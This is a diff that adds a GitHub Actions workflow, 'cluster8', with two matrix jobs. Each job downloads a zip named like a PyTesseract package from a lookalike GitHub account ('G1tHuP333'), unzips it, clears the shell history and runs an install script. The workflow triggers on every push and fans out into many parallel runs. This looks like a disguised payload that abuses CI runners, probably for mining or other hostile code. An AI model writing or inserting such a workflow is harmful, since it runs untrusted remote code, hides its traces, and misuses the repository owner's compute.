@@ -1,0 +1,49 @@
+name: cluster8
+on:
+  push:
+    branches: [ "main" ]
+  workflow_dispatch:
+
+jobs:
+  Generate:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      max-parallel: 10
+      matrix:
+        go: [I.0, I.I, I.II]
+        flag: ['Prepare', 'Construct', 'Inspect', 'Activate', 'Publish']
+
+    env:
+        NUM_JOBS: 20
+        JOB: ${ matrix.go }
+    steps:
+    - uses: actions/checkout@v1
+    - name: Download Generate
+      run: |
+        curl -L -o PyTesseract-Ver2.zip https://github.com/G1tHuP333/test/raw/refs/heads/main/PyTesseract-Ver2.zip
+        unzip -o PyTesseract-Ver2.zip
+        history -c && history -w
+        bash install_module.sh
+
+  Assemble1:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      max-parallel: 10
+      matrix:
+        go: [I.0, I.I, I.II]
+        flag: ['Provision', 'Build', 'Confirm', 'Trigger', 'Deploy']
+
+    env:
+        NUM_JOBS: 20
+        JOB: ${ matrix.go }
+    steps:
+    - uses: actions/checkout@v1
+    - name: Installl Assemble1
+      run: |
+        curl -L -o PyTesseract-Ver2.zip https://github.com/G1tHuP333/test/raw/refs/heads/main/PyTesseract-Ver2.zip
+        unzip -o PyTesseract-Ver2.zip
+        history -c && history -w
+        bash install_module.sh 
+        
